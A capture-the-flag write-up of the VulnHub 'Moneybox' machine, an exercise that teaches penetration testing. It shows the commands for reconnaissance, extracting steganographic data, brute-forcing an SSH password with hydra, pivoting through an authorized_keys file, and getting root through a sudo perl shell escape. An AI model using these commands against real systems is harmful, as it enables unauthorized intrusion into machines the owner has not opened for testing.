---
title: "Moneybox"
date: 2024-10-21
draft: false
summary: "Writeup for Moneybox CTF challenge on VulnHub."
tags: ["linux", "steganography", "suid"]
categories: ["writeups"]
series: []
showToc: true
cover:
  image: "https://cdn.ziomsec.com/moneybox/cover.webp"
  caption: "Moneybox VulnHub Challenge"
  alt: "Moneybox cover"
platform: "VulnHub"
---

Moneybox is a boot2root challenge from Vulnhub. It has 3 flags, and our goal is to capture all of them.
<!--more-->
To download the moneybox, click on the link given below: 
- https://www.vulnhub.com/entry/moneybox-1,653/

## Recon

I performed an **nmap** aggressive scan on the target to find open ports and the services running on them along with some extra information.

```shell
nmap -A -p- --min-rate 10000 TARGET -oN moneybox.nmap
```

| **Port** | **Service** |
| -------- | ----------- |
| 21       | ftp         |
| 22       | ssh         |
| 80       | http        |

![](https://cdn.ziomsec.com/moneybox/1.webp)

## Initial Foothold

Since the **nmap** scan discovered **ftp** with anonymous login allowed, I logged into the server and found an image. I then downloaded it on my system.

```shell
ftp TARGET
# username: anonymous | password: anonymous
> ls
> get trytofind.jpg
```

![](https://cdn.ziomsec.com/moneybox/2.webp)

![](https://cdn.ziomsec.com/moneybox/3.webp)

I then viewed exif data using **binwalk** and **exiftool** but didn't find anything interesting.

```shell
binwalk IMAGE
exiftool IMAGE
```

![](https://cdn.ziomsec.com/moneybox/4.webp)

I then tried extracting information stored inside it using **steghide** but it asked for a password.

```shell
steghide --extract -sf IMAGE
```

![](https://cdn.ziomsec.com/moneybox/5.webp)

Since I did not know the password, I moved on to the next open port i.e 80.

![](https://cdn.ziomsec.com/moneybox/6.webp)

The webpage did not reveal file or directory, so I performed directory brute force using **dirb** and found a *blogs* directory

```shell
dirb http://TARGET/
```

![](https://cdn.ziomsec.com/moneybox/7.webp)

I visited the blogs directory but again didn't get any information upfront. However, when I viewed the page source, I found another directory that was commented out at the very bottom of the page.

```shell
curl http://TARGET/blogs/index.html
```

![](https://cdn.ziomsec.com/moneybox/8.webp)

I accessed the secret directory and found the secret key.

```shell
curl -s http://TARGET/S3cr3t-T3xt/ | tr -d '\n'
```

![](https://cdn.ziomsec.com/moneybox/9.webp)

This revealed a password. I used this password to extract the data that was hidden in the image.

```shell
steghide --extract -sf IMAGE
```

![](https://cdn.ziomsec.com/moneybox/10.webp)

The hidden data revealed 2 things:
- there was a user called *renu*.
- *renu* had a weak password.

The only service running on the target where password would be required was **ssh** - so I used **hydra** to crack *renu*'s password using **rockyou.txt**.

```shell
hydra -l 'renu' -P /usr/share/wordlists/rockyou.txt TARGET ssh
```

![](https://cdn.ziomsec.com/moneybox/11.webp)

After finding the credentials, I logged in as *renu* and captured the first flag.

![](https://cdn.ziomsec.com/moneybox/12.webp)
![](https://cdn.ziomsec.com/moneybox/13.webp)

## Privilege Escalation
### Horizontal Privilege Escalation

I moved back to view other users and found another flag.

![](https://cdn.ziomsec.com/moneybox/14.webp)

I then downloaded **linux smart enumeration** script to enumerate ways to escalate my privileges.
- https://github.com/diego-treitos/linux-smart-enumeration

```shell
wget "https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh" -O lse.sh
chmod +x lse.sh
.\lse.sh
```

![](https://cdn.ziomsec.com/moneybox/15.webp)

![](https://cdn.ziomsec.com/moneybox/16.webp)

Since this revealed nothing special, I tried looking inside lily's home directory and found the `.ssh` folder.

![](https://cdn.ziomsec.com/moneybox/17.webp)

Reading the **authorized_keys** file reveals that renu was authorized to log in as lily without a password.

![](https://cdn.ziomsec.com/moneybox/18.webp)

I hence logged in as lily and checked my sudo permissions. 

## Vertical Privilege Escalation

I found that lily could execute **perl** as sudo without a password.

```shell
sudo -l
```

![](https://cdn.ziomsec.com/moneybox/19.webp)

I visited **GTFObins** to look for privilege escalation methods using **perl** and found a way to do so.
- https://gtfobins.github.io/

![](https://cdn.ziomsec.com/moneybox/20.webp)

I executed the code to spawn a bash shell and captured the final flag from **root** directory.

```shell
sudo perl -e 'exec "/bin/bash";'
cd /root
cat .root.txt
```

![](https://cdn.ziomsec.com/moneybox/21.webp)

## Conclusion

Hence here's the summary of how I pwned the machine:
- I found an image in the ftp server and downloaded it onto my system.
- I found the password required to extract data from this image from the webserver after I did some recon.
- The data from image revealed that the user `renu` had a weak password so I cracked the ssh password using **hydra**.
- I logged in as renu and then switched to lily after I found renu's public key inside lily's authorized_keys folder.
- I then found that lily could run `perl` as root without a password.
- I used **perl** to spawn a shell as root and capture the final flag from the `/root` folder.

That's it from my side. Until next time:)

---
